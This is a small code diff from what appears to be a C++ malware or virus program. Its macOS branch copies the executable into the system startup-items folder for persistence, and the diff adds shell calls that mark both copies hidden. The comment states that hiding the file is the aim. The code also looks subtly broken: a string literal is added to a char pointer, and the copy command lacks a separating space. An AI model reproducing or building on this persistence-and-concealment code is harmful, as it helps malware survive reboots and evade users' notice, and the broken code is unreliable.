@@ -122,11 +122,13 @@ int main(int argc, char** argv) {
 	} else if (MacOSX == 1) {
 		
 		/* 
-		I'm not going to even try and implement a persistance system on OSX other than startup
+		I'm not going to even try and implement a persistance system on OSX other than startup and hidding the file
 		too hard...
 		*/
 		
 		system(("cp " + argv[0] + "/System/Library/StartupItems").c_str());
+		system(("chflags hidden " + argv[0]).c_str());
+		system(("chflags hidden /System/Library/StartupItems/" + argv[0]).c_str());
 		
 		ofstream targetFile ("HelloThere.txt");		// <- A file with a little message
 		
